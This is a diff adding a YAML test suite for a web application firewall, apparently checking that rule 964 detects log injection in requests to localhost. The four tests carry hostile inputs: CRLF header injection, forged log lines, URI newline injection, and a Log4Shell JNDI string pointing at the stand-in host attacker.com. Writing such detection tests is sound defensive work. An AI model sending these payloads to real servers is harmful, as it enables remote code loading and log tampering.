@@ -1,0 +1,63 @@
+meta:
+  author: "Antigravity"
+  description: "Log Injection Tests"
+  enabled: true
+  name: "964-log-injection"
+tests:
+  - test_id: 964100
+    desc: "Log Injection: CRLF in User-Agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "Mozilla/5.0\r\nInjected-Header: malicious"
+              Host: "localhost"
+            uri: "/"
+          output:
+            log_contains: "id \"964"
+  - test_id: 964101
+    desc: "Log Injection: Log Forging"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "username=admin%0a[INFO] User admin logged in successfully"
+          output:
+            log_contains: "id \"964"
+  - test_id: 964102
+    desc: "Log Injection: Log4Shell Pattern"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "${jndi:ldap://attacker.com/a}"
+              Host: "localhost"
+            uri: "/"
+          output:
+            log_contains: "id \"964"
+  - test_id: 964103
+    desc: "Log Injection: Newline in Parameter"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+            uri: "/?user=test%0d%0aAdmin%20access%20granted"
+          output:
+            log_contains: "id \"964"
